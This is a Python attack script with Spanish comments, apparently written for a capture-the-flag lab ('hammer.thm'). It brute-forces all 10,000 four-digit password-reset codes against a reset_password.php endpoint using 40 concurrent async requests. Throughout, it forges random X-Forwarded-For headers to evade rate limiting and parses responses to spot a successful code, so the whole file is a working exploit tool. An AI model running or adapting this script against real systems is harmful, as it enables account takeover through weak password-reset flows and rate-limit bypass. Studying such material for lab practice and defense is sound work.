"""
Hammer Breaker v7.0 - The "No Bullshit" Edition
Advanced Session Handling & Strict Response Validation.

Author: Senior Python Architect
Changelog:
- Added STRICT validation: Detects if server kicked us back to Step 1.
- Added 'email' to brute-force payload to maintain state persistence.
- Added Debug output on success to visually confirm the page content.
"""

import asyncio
import aiohttp
import random
import logging
import sys
from typing import Optional, Dict

# Configuración de Logging
logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("HammerBreaker")

# --- CONFIGURACIÓN ---
# ¡ASEGÚRATE DE QUE LA URL ES CORRECTA!
TARGET_URL = "http://10.10.XX.XX:1337/reset_password.php" 
TARGET_EMAIL = "tester@hammer.thm"
THREADS = 40  # Bajamos un pelín para no ahogar al servidor

class HammerAttack:
    def __init__(self):
        self.found_code = None
        self.stop_event = asyncio.Event()

    def get_headers(self) -> Dict[str, str]:
        """
        Genera cabeceras dinámicas.
        Spoofing IP es CRÍTICO para evitar el Rate Limit (429).
        """
        fake_ip = f"{random.randint(10, 250)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
        return {
            "X-Forwarded-For": fake_ip,
            "User-Agent": "HammerBreaker/v7-Pro",
            "Content-Type": "application/x-www-form-urlencoded"
        }

    async def attempt(self, session, code):
        if self.stop_event.is_set(): return

        code_str = f"{code:04d}"
        
        # Payload Completo: Código + Timer + Email (para persistencia)
        data = {
            "recovery_code": code_str,
            "s": "160", 
            "email": TARGET_EMAIL 
        }

        try:
            # Usamos la sesión compartida (con la cookie PHPSESSID)
            async with session.post(TARGET_URL, data=data, headers=self.get_headers()) as response:
                text = await response.text()
                
                # --- LÓGICA DE DETECCIÓN MEJORADA ---
                
                # 1. Caso: Rate Limit real
                if response.status == 429:
                    print(f"!", end="", flush=True)
                    return

                # 2. Caso: Código Incorrecto (El servidor dice explícitamente "Invalid...")
                if "Invalid" in text:
                    # Fallo normal, seguimos probando
                    return

                # 3. Caso: Nos han echado al paso 1 (Vemos el campo de poner email)
                # Esto causaba los falsos positivos antes.
                if 'name="email"' in text and "Enter Recovery Code" not in text:
                    # El servidor ha reiniciado el proceso silenciosamente.
                    # No es un éxito, es un fallo de sesión.
                    return

                # 4. Caso: Éxito
                # Si no dice "Invalid" Y no estamos en la página de login...
                if response.status == 200:
                    print(f"\n\n[🔥] POTENTIAL MATCH: {code_str}")
                    print(f"[?] Server Response Snippet: {text[:150]}...") # Ver qué nos devuelve
                    
                    # Si vemos el dashboard o un cambio claro, paramos.
                    self.found_code = code_str
                    self.stop_event.set()

        except Exception as e:
            pass
        finally:
            # Feedback visual minimalista (un punto cada 100 intentos)
            if code % 100 == 0:
                print(".", end="", flush=True)

    async def run(self):
        print(f"[*] Target: {TARGET_URL}")
        print(f"[*] Email: {TARGET_EMAIL}")
        print("[*] Initializing Session (Getting PHPSESSID)...")

        # CookieJar gestiona las cookies automáticamente entre peticiones
        async with aiohttp.ClientSession() as session:
            # PASO 1: Iniciar el reset para obtener la Cookie válida
            init_data = {"email": TARGET_EMAIL}
            async with session.post(TARGET_URL, data=init_data) as resp:
                text = await resp.text()
                if "Invalid email" in text:
                    print("[X] FATAL ERROR: El email 'tester@hammer.thm' no es válido en esta instancia.")
                    return
                
                print("[+] Session Initialized! Cookies obtained:")
                for cookie in session.cookie_jar:
                    print(f"    └── {cookie.key}: {cookie.value}")

            # PASO 2: Ataque
            print(f"\n[*] Starting Brute Force ({THREADS} threads)...")
            print("[*] Filtering out false positives (Step 1 redirects)...")
            
            tasks = []
            sem = asyncio.Semaphore(THREADS)

            async def wrapper(c):
                async with sem:
                    await self.attempt(session, c)

            # Lanzamos las 10,000 tareas
            for code in range(10000):
                if self.stop_event.is_set(): break
                tasks.append(asyncio.create_task(wrapper(code)))

            await asyncio.gather(*tasks)
            
            if not self.found_code:
                print("\n[X] Completed range without valid code. Check IP spoofing or wordlist.")

if __name__ == "__main__":
    # Fix para Windows
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
    attack = HammerAttack()
    try:
        # Input rápido para no editar código si cambia la IP
        u = input(f"Target URL (Enter to use default code var): ").strip()
        if u: TARGET_URL = u
        
        asyncio.run(attack.run())
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")